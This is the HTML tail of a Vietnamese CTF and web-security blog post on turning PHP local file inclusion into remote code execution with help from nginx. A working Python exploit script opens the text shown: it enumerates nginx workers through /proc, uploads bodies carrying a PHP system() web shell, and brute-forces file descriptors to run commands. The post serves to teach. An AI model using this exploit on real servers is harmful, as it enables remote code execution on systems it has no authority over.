<span class="n">cpus</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="s">'processor'</span><span class="p">)</span>

<span class="n">r</span>  <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'file'</span><span class="p">:</span> <span class="s">'/proc/sys/kernel/pid_max'</span>
<span class="p">})</span>
<span class="n">pid_max</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] cpus: </span><span class="si">{</span><span class="n">cpus</span><span class="si">}</span><span class="s">; pid_max: </span><span class="si">{</span><span class="n">pid_max</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">nginx_workers</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pid_max</span><span class="p">):</span>
    <span class="n">r</span>  <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'file'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/cmdline'</span>
    <span class="p">})</span>

    <span class="k">if</span> <span class="sa">b</span><span class="s">'nginx: worker process'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[*] nginx worker found: </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

        <span class="n">nginx_workers</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">nginx_workers</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">cpus</span><span class="p">:</span>
            <span class="k">break</span>

<span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1"># upload a big client body to force nginx to create a /var/lib/nginx/body/$X
</span><span class="k">def</span> <span class="nf">uploader</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[+] starting uploader'</span><span class="p">)</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">done</span><span class="p">:</span>
        <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">'&lt;?php system($_GET["c"]); /*'</span> <span class="o">+</span> <span class="mi">16</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="s">'A'</span><span class="p">)</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">uploader</span><span class="p">)</span>
    <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>

<span class="c1"># brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
</span><span class="k">def</span> <span class="nf">bruter</span><span class="p">(</span><span class="n">pid</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">done</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">done</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[+] brute loop restarted: </span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
            <span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'/proc/self/fd/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/../../../</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s">/fd/</span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">'</span>
            <span class="n">r</span>  <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
                <span class="s">'file'</span><span class="p">:</span> <span class="n">f</span><span class="p">,</span>
                <span class="s">'c'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'id'</span>
            <span class="p">})</span>
            <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] </span><span class="si">{</span><span class="n">f</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="n">done</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="nb">exit</span><span class="p">()</span>

<span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="n">nginx_workers</span><span class="p">:</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">bruter</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="p">))</span>
    <span class="n">a</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="t√†i-li·ªáu-tham-kh·∫£o"><span class="mr-2">T√†i li·ªáu tham kh·∫£o</span><a href="#t√†i-li·ªáu-tham-kh·∫£o" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">LFI_With_PHPInfo_Assistance</a></p><p><a href="https://notlaura.com/output-buffering/">What is PHP Output Buffering?</a></p><p><a href="https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">PHP_LFI_rfc1867_temporary_files</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo">File Inclusion/Path traversal - HackTricks</a></p><p><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">PHP LFI with Nginx Assistance</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE - to^&amp;url=https://to016.github.io//posts/PHPLFI2RCE/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE - to^&amp;u=https://to016.github.io//posts/PHPLFI2RCE/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/PHPLFI2RCE/&amp;text=C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker v√† Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/31linephp/"><div class="card-body"> <em class="timeago small" data-ts="1649176500" > 2022-04-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>31 Line PHP - SPbCTF2021</h3><div class="text-muted small"><p> Challenge n√†y t·ª´ nƒÉm ngo√°i nh∆∞ng m√¨nh v·∫´n mu·ªën vi·∫øt b·ªüi 1 ph·∫ßn n√≥ kh√° hay v√† l√≠ do ngo√†i l·ªÅ kh√°c l√† nƒÉm nay m√¨nh m·ªõi t·∫≠p t√†nh vi·∫øt blog üòù Source code source code Ph√¢n t√≠ch Nh√¨n qua source code th...</p></div></div></a></div><div class="card"> <a href="/posts/crewctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1650200220" > 2022-04-17 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CrewCTF 2022</h3><div class="text-muted small"><p> ·ªû post m√¨nh s·∫Ω vi·∫øt writeup cho 4/7 b√†i web c·ªßa gi·∫£i crewctf2022 m√† m√¨nh gi·∫£i ƒë∆∞·ª£c. 1. CuaaS B√†i n√†y ch·ªâ ƒë∆°n gi·∫£n l√† ƒë·ªçc v√† hi·ªÉu ƒë∆∞·ª£c c√°ch ho·∫°t ƒë·ªông c·ªßa trang web th√¨ s·∫Ω gi·∫£i ra. Link challenge h...</p></div></div></a></div><div class="card"> <a href="/posts/angstromctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651505100" > 2022-05-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AngstromCTF 2022</h3><div class="text-muted small"><p> My solution for some web challenges in this competition The Flash Use DOM breakpoints in Chrome devtools, right click on p tag and chose Break on -&amp;gt; subtree modifications then step over to get...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SWandMITM/" class="btn btn-outline-primary" prompt="Older"><p>Service worker v√† Man-in-the-Middle Attack</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2022 <a href="https://twitter.com/nguyendt0">T√¥ ƒê·ªânh Nguy√™n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
